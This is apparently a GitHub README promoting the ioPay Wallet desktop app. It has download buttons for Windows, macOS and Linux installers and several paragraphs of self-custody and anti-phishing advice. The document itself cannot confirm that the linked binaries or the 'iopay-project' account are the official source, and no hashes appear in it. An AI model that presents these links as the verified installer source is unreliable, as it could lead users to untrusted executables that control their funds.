![ioPay Wallet](assets/banner-profile.png)

<h1 align="center">ioPay Wallet</h1>

<p align="center"><em>Self-custody moves the risk from a company's servers to your own habits, and the habits can be learned.</em></p>

<p align="center"><a href="#license"><img src="https://img.shields.io/badge/LICENSE-Apache--2.0-0969da?style=for-the-badge&labelColor=0B1733" alt="License: Apache-2.0"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2"><img src="https://img.shields.io/badge/RELEASE-v2.0.2-0969da?style=for-the-badge&labelColor=0B1733" alt="Release: v2.0.2"></a></p>

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

Check the source before you install: the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2).

> **Phishing looks like help.** The only installer source is the release page above.

## Why ioPay Wallet

The phrase "not your keys, not your coins" is repeated so often that it has stopped meaning anything. In practice it means one thing: the secret that controls the funds is stored somewhere you can lose it. ioPay Wallet puts that secret on your own computer, encrypted in the operating system's keychain, and gives the application a PIN that unlocks it locally. Nothing about the account is held by a server, and there is no login that could be reset by someone who convinces a support agent.

That arrangement is only as good as the habits around it. A wallet that stores keys well still cannot save a reader who types the phrase into a page that offers to "validate" it, or who installs a build from a site that copied the screenshots. The security pages on this account start from those failures rather than from feature claims: what a phishing page asks for, what a genuine installer is named, what the app lock does and does not protect, and what to do when the local database will not open.

- **Keys stay local.** The wallet generates and stores them on the machine, protected by the app lock and the OS keychain.
- **Signing stays deliberate.** Hardware signing is available for Ledger and Trezor, with the address confirmed on the device screen.
- **Phishing is a page problem.** The warning layer in the app is one signal, not a guarantee; the guides explain what it cannot judge.
- **Recovery is a phrase problem.** A locked app is recoverable, a lost phrase is not, and the two failures need different first steps.

## Where the real risks are

The most common loss on a self-custody wallet is not a broken cipher. It is a reader following a link that looked right. A convincing copy of a download page, an advertisement above the real result, a direct message offering help with a migration: each one asks for the same thing, and each one is defeated by the same rule. No support route needs the phrase, and no legitimate page asks a reader to type it to prove ownership.

The second risk is a build with the right name and the wrong contents. This release publishes three files whose SHA-256 values are in the app README, so the practical check is the source page, the file name, version and size, and a hash comparison. A file called something else, offered with urgency, is the pattern to refuse.

The third is impatience with a failure. A wallet that will not start, a database reported as corrupted, a password rejected after an update - each has a safe sequence, and the unsafe version of every one of them is reinstalling first and asking later. The guides put the backup check before the reinstall for that reason.

## Three failures that look alike

A phishing loss, a lost phrase and a corrupted database all present as the same sentence: the wallet will not show my funds. They have nothing else in common. A phishing loss means the key was used by someone else, and the chain will show a transfer you did not sign. A lost phrase means the key is gone from your control, and no local repair changes that. A corrupted database means the key may still be present on the disk while the application cannot read its own store.

The first response should identify which of the three you are in before touching anything. Checking the address on a block explorer costs nothing and answers the first case. Searching the machine for a backup and testing the phrase in a fresh install answers the second. Only the third has a technical repair path, and even then the safe order starts with the backup rather than the reinstall.

The temptation in all three is speed. Reinstalling feels like progress, and it is the one action that can turn a recoverable local fault into an unrecoverable one if the phrase was never written down. The guides place the backup check before every destructive step for that reason, not because reinstallation is dangerous in itself.

## Guides for this part of the wallet

| Guide | What it answers |
|---|---|
| [Is ioPay Wallet Safe?](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/is-iopay-wallet-safe-to-use.md) | Custody, what the app protects, and the checks that replace a badge. |
| [Spotting Fake ioPay Wallet Downloads](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/spotting-fake-iopay-wallet-downloads.md) | The lookalike pages that outrank the real release, and the four checks that expose them. |
| [ioPay Wallet Phishing Warnings Explained](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-phishing-warnings-explained.md) | What the phishing warning layer catches, and the approvals it cannot judge at all. |
| [Database Corrupted: What to Do](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/iopay-wallet-database-corrupted-fix.md) | Repairing or reinstalling when the local store fails, without losing an unbacked account. |
| [Recover a Locked ioPay Account](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/recover-a-locked-iopay-wallet-account.md) | Phrase, private key and keystore as three different recovery routes into one account. |

This repository belongs to the ioPay Wallet account as an additional way in; the wallet is the product, and the safety guides are the substance.

## Security

**Nobody legitimate asks for the phrase, and a page that does is the attack, however polished it looks.**

## Support

There is no issue tracker here and no support desk with access to your keys. The [help guide](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/how-to-get-help-with-iopay-wallet.md) explains which contact routes exist and which are imitations.

## License

Apache-2.0, the same licence the ioPay Wallet project carries.

---

[Wallet repository](https://github.com/iopay-project/iopay-desktop-wallet) - [v2.0.2 release](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2) - [All guides](https://github.com/iopay-project/desktop-setup-and-safety)
